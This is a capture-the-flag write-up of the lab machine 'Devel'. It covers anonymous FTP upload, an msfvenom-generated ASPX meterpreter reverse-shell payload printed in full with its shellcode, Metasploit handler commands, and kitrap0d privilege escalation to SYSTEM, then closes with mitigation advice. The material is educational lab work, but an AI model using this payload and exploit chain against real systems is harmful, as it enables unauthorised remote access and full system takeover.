# Devel

As always, we first run an Nmap scan. I decided to not use nmapAutomator for this one. Always good to not rely on tools if possible.

```
sudo nmap -sC -sV 10.129.82.146
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-16 10:54 EST
Nmap scan report for 10.129.82.146
Host is up (0.026s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

We see a ftp, and http port open here.
I quickly check out the website, but it's very bare, so lets check out the ftp. We can see from the scan that anonymous login is allowed. So we can fill out both name and password with "anonymous"

```
sudo rlwrap ftp 10.129.82.146
Connected to 10.129.82.146.
220 Microsoft FTP Service
Name (10.129.82.146:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> mkdir test
257 "test" directory created.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
01-16-21  05:59PM       <DIR>          test
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 

```

We can log in anonymously, and we have write access. This is very good for us. As we can now save our own files to the target server.

I first tried uploading a php reverse shell, but it did not work. So what other web based applications are there to use? Well, we can see that there is an aspnet_client folder in the web server. ASP.NET is a server-side web-application framework, and uses the .aspx suffix. So we use metasploit to create a reverse shell in aspx.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=1234 -f aspx > hello.aspx`

Here we use -p to select a payload, a reverse_tcp as the type, set our ip as the LHOST, and a port. -f signals that we are creating an .aspx file. And we output it to a file.

Which looks like this:

```
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] g0KiVu1Ql = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,
0x28,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,
0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,
0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,
0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x4b,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,
0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,
0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,
0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,
0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,
0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,
0x00,0x53,0xff,0xd5 };

        IntPtr ejiJULy = VirtualAlloc(IntPtr.Zero,(UIntPtr)g0KiVu1Ql.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(g0KiVu1Ql,0,ejiJULy,g0KiVu1Ql.Length);
        IntPtr eeRvj = IntPtr.Zero;
        IntPtr wonjbeRt = CreateThread(IntPtr.Zero,UIntPtr.Zero,ejiJULy,IntPtr.Zero,0,ref eeRvj);
    }
</script>
```
Now that we have created the backdoor, we have to upload it:

```
sudo rlwrap ftp 10.129.82.146
Connected to 10.129.82.146.
220 Microsoft FTP Service
Name (10.129.55.78:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put ./hello.aspx 
local: ./hello.aspx remote: ./hello.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2915 bytes sent in 0.00 secs (71.2810 MB/s)
ftp> exit
```

Now we open up the metasploit multi/handler to listen for the connection.
exitonsession false means that even if the connection fails, it will still be listening.

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.36
lhost => 10.129.82.146
msf6 exploit(multi/handler) > set lport 1234
lport => = 1234
msf6 exploit(multi/handler) > set exitonsession false
exitonsession => false
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.36:1234 
msf6 exploit(multi/handler) > [*] Sending stage (175174 bytes) to 10.129.82.146
[*] Meterpreter session 1 opened (10.10.14.36:1234 -> 10.129.82.146:49157) at 2020-11-30 16:19:47 -0500
msf6 exploit(multi/handler) > dir
[*] exec: dir

10.129.57.221  hello.aspx  na.txt  nmap  php-reverse-shell.php  shell.exe
```

We activate the listener by heading to `http://10.129.82.146/devel.aspx`

I messed around some here, but I did not have privileges. So I had to find a way to escalate my privilege. You can also see my other failed attempts lying in the folder.

So I set the current connection to the background by just sending the command:

`meterpreter > background`

And used meterpreters own exploit suggester to find a possible escalation exploit. Which is only possible on x86 architecture.
This can be checked with the `sysinfo` command in metasploit. 

```
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.55.78 - Collecting local exploits for x86/windows...
[*] 10.129.55.78 - 35 exploit checks are being tried...
[+] 10.129.55.78 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.129.55.78 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.55.78 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.55.78 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.55.78 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.55.78 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

I tried the bypassuac_eventvwr, but it failed. The next one works, however:


```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.50.111   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.14.36
lhost => 10.10.14.75
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

```
[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] Launching notepad to host the exploit...
[+] Process 3632 launched.
[*] Reflectively injecting the exploit DLL into 3632...
[*] Injecting exploit into 3632 ...
[*] Exploit injected. Injecting payload into 3632...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.82.146
[*] Meterpreter session 3 opened (10.10.14.36:4444 -> 10.129.82.146:49159) at 2020-11-30 16:37:20 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
c:\Windows\Temp
```

So now I just cd my way to the administrator's desktop and read the root. Except:

```
meterpreter > type root.txt
[-] Unknown command: type.
meterpreter > dir
Listing: c:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-17 19:16:53 -0400  desktop.ini
100444/r--r--r--  32    fil   2017-03-17 19:17:20 -0400  root.txt.txt

meterpreter > type root.txt.txt
[-] Unknown command: type.
meterpreter > file root.txt
[-] Unknown command: file.
meterpreter > more root.txt
[-] Unknown command: more.
meterpreter > more root.txt.txt
[-] Unknown command: more.
```

So I guess I'm just gonna download it then...

```
meterpreter > download root.txt.txt
[*] Downloading: root.txt.txt -> root.txt.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): root.txt.txt -> root.txt.txt
[*] download   : root.txt.txt -> root.txt.txt
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd 
cd Administrator           cd Classic\ .NET\ AppPool  cd Default\ User           cd babis
cd All\ Users              cd Default                 cd Public                  
meterpreter > cd babis
meterpreter > cd Desktop
meterpreter > download user.txt.txt
[*] Downloading: user.txt.txt -> user.txt.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): user.txt.txt -> user.txt.txt
[*] download   : user.txt.txt -> user.txt.txt
meterpreter > 
```

## Comparing to the official writeup:

The official writeup first tested dirbuster against the webserver, which does not reveal anything. So they assume the most likely attack vector is ftp. We essentially did the same thing, but their method was faster than mine. As I manually went through the site, checking for something interesting. Dirbuster was a good choice, especially since the main page does not link to anything else, except out of the domain. 

The official writeup immediately recognizes the ASP.NET client, and therefore knows that .aspx is what needs to be used. While I had to do some trial and error to discover this. Now I know.

After getting access, they immediately run getuid to reveal that they are the IIS user. They know that this user does not have write permissions for the machine. And immediately begin setting up for privilege escalation. I did some sleuthing around to check if I could get privilege on the user, before giving up and looking to the metasploit framework for escalation.

Overall the official writeup just seems to have more experience. And is therefore able to take more efficient decisions. I am sure this will come with time.

## How to stop this exploit:

First of all, the anonymous ftp user should not have write access to the server at all. The anonymous user should probably just be removed unless necessary for some reason.

And secondly, to stop the privilege escalation. Patch the operating system. Keep it updated.

there is a complete explanation of the exploit here: https://www.exploit-db.com/exploits/11199

